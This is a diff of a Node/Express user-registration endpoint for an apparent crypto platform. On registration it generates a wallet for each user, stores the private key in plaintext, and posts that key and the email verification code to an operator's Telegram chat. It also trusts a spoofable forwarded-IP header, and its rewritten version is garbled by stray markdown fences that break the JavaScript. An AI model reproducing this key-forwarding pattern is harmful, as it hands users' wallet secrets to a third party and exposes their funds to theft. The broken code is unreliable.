@@ -1,95 +1,99 @@
 app.post("/register", async (req, res) => {
-  try {
-    const {
-      fullname,
-      nickname,
-      referrer_id,
-      country,
-      phone,
-      email,
-      password
-    } = req.body;
+try {
+const {
+fullname,
+nickname,
+referrer_id,
+country,
+phone,
+email,
+password
+} = req.body;
 
-    if (!email || !password) {
-      return res.json({ success: false });
-    }
+```
+if (!email || !password) {
+  return res.json({ success: false, message: "No data" });
+}
 
-    const emailLower = email.toLowerCase();
+const emailLower = email.toLowerCase();
 
-    // ===== IP =====
-    let ip = req.headers["x-forwarded-for"] || req.socket.remoteAddress || "";
+// ===== IP =====
+let ip = req.headers["x-forwarded-for"] || req.socket.remoteAddress || "";
 
-    if (ip.includes(",")) {
-      ip = ip.split(",")[0].trim();
-    }
+if (ip.includes(",")) {
+  ip = ip.split(",")[0].trim();
+}
 
-    // 🔥 FIX (IPv6 Render)
-    if (ip.includes("::ffff:")) {
-      ip = ip.replace("::ffff:", "");
-    }
+if (ip.includes("::ffff:")) {
+  ip = ip.replace("::ffff:", "");
+}
 
-    // ===== АНТИ-АБУЗ =====
-    const { data: ipUsers } = await supabase
-      .from("users")
-      .select("id")
-      .eq("ip", ip);
+// ===== АНТИ-АБУЗ =====
+const { data: ipUsers } = await supabase
+  .from("users")
+  .select("id")
+  .eq("ip", ip);
 
-    if (ipUsers && Array.isArray(ipUsers) && ipUsers.length >= 3) {
-      return res.json({ success: false, message: "Too many accounts" });
-    }
+if (ipUsers && ipUsers.length >= 3) {
+  return res.json({ success: false, message: "Too many accounts" });
+}
 
-    const { data: existing } = await supabase
-      .from("users")
-      .select("*")
-      .eq("email", emailLower)
-      .maybeSingle();
+// ===== CHECK EMAIL =====
+const { data: existing } = await supabase
+  .from("users")
+  .select("*")
+  .eq("email", emailLower)
+  .maybeSingle();
 
-    if (existing) {
-      return res.json({ success: false, message: "User exists" });
-    }
+if (existing) {
+  return res.json({ success: false, message: "User exists" });
+}
 
-    const hash = await bcrypt.hash(password, 10);
-    const code = Math.floor(100000 + Math.random() * 900000).toString();
+const hash = await bcrypt.hash(password, 10);
+const code = Math.floor(100000 + Math.random() * 900000).toString();
 
-    let wallet_address = null;
-    let private_key = null;
+let wallet_address = null;
+let private_key = null;
 
-    try {
-      const wallet = Wallet.createRandom();
-      wallet_address = wallet.address;
-      private_key = wallet.privateKey;
-    } catch {}
+try {
+  const wallet = Wallet.createRandom();
+  wallet_address = wallet.address;
+  private_key = wallet.privateKey;
+} catch {}
 
-    const { data, error } = await supabase
-      .from("users")
-      .insert([{
-        fullname,
-        nickname,
-        referrer_id,
-        country,
-        phone,
-        email: emailLower,
-        password: hash,
-        balance: 1000,
-        deposit: 0,
-        satellites: 0,
-        wallet_address,
-        private_key,
-        email_code: code,
-        email_verified: false,
-        ip: ip
-      }])
-      .select()
-      .maybeSingle(); // 🔥 FIX (було single)
+const { data, error } = await supabase
+  .from("users")
+  .insert([{
+    fullname,
+    nickname,
+    referrer_id,
+    country,
+    phone,
+    email: emailLower,
+    password: hash,
+    balance: 1000,
+    deposit: 0,
+    satellites: 0,
+    wallet_address,
+    private_key,
+    email_code: code,
+    email_verified: false,
+    ip: ip
+  }])
+  .select()
+  .maybeSingle();
 
-    if (error) {
-      console.log(error);
-      return res.json({ success: false });
-    }
+// 🔥 ГОЛОВНИЙ ФІКС
+if (error || !data) {
+  console.log("INSERT ERROR:", error);
+  return res.json({ success: false, message: "Insert error" });
+}
 
-    // ===== TELEGRAM =====
-    try {
-      const text = `
+// ===== TELEGRAM =====
+try {
+  const text = `
+```
+
 🆕 NEW USER
 
 ID: ${data.id}
@@ -110,24 +114,26 @@ ${data.private_key}
 🔑 CODE: ${code}
 
 👥 Ref: ${data.referrer_id || "—"}
-      `;
+`;
 
-      await axios.post(
-        `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`,
-        {
-          chat_id: CHAT_ID,
-          text
-        }
-      );
-
-    } catch (e) {
-      console.log("TG ERROR:", e.message);
+```
+  await axios.post(
+    `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`,
+    {
+      chat_id: CHAT_ID,
+      text
     }
+  );
 
-    return res.json({ success: true });
+} catch (e) {
+  console.log("TG ERROR:", e.message);
+}
 
-  } catch (err) {
-    console.log("REGISTER ERROR:", err);
-    return res.json({ success: false });
-  }
+return res.json({ success: true });
+```
+
+} catch (err) {
+console.log("REGISTER ERROR:", err);
+return res.json({ success: false, message: "Server error" });
+}
 });
